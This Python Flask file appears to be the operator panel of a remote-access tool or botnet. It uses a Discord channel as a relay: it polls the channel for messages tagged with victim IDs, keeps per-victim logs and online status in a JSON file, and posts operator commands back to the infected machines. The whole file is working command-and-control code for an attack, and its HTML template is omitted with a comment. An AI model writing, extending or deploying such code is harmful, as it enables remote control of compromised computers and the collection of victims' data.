import os, time, json, threading, requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
if not BOT_TOKEN or not CHANNEL_ID:
    BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
    CHANNEL_ID = "YOUR_CHANNEL_ID_HERE"

DATA_FILE = "victims_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {"victims": {}, "log_queues": {}}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def fetch_loop():
    last_id = None
    while True:
        try:
            url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages?limit=10"
            headers = {"Authorization": f"Bot {BOT_TOKEN}"}
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                msgs = resp.json()
                data = load_data()
                victims = data["victims"]
                log_queues = data["log_queues"]
                for msg in msgs:
                    mid = msg.get("id")
                    if last_id and mid == last_id:
                        break
                    content = msg.get("content", "")
                    if content.startswith("[") and "]" in content:
                        bracket = content.find("]")
                        victim_id = content[1:bracket]
                        rest = content[bracket+1:].strip()
                        if victim_id not in victims:
                            victims[victim_id] = {"last_seen": time.time(), "logs": []}
                        victims[victim_id]["last_seen"] = time.time()
                        if victim_id not in log_queues:
                            log_queues[victim_id] = []
                        log_queues[victim_id].append(rest)
                        if len(log_queues[victim_id]) > 200:
                            log_queues[victim_id] = log_queues[victim_id][-200:]
                if msgs:
                    last_id = msgs[0]["id"]
                save_data(data)
            elif resp.status_code == 429:
                retry = resp.json().get("retry_after", 1)
                time.sleep(retry)
        except Exception as e:
            print(f"Fetch error: {e}")
        time.sleep(3)

threading.Thread(target=fetch_loop, daemon=True).start()

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/victims')
def api_victims():
    data = load_data()
    victims = data["victims"]
    vlist = []
    for vid, vdata in victims.items():
        vlist.append({
            "id": vid,
            "last_seen": vdata["last_seen"],
            "online": (time.time() - vdata["last_seen"]) < 70
        })
    return jsonify(vlist)

@app.route('/api/logs/<victim_id>')
def api_logs(victim_id):
    data = load_data()
    log_queues = data["log_queues"]
    return jsonify(log_queues.get(victim_id, []))

@app.route('/send', methods=['POST'])
def send_command():
    data = request.json
    victim_id = data.get('victim')
    command = data.get('command')
    if not command:
        return jsonify({'success': False, 'error': 'No command'})
    final = f"{command} @{victim_id}" if victim_id else command
    url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages"
    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    try:
        r = requests.post(url, headers=headers, json={"content": final}, timeout=10)
        if r.status_code == 200:
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': f"HTTP {r.status_code}"})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# HTML same as before (no changes)
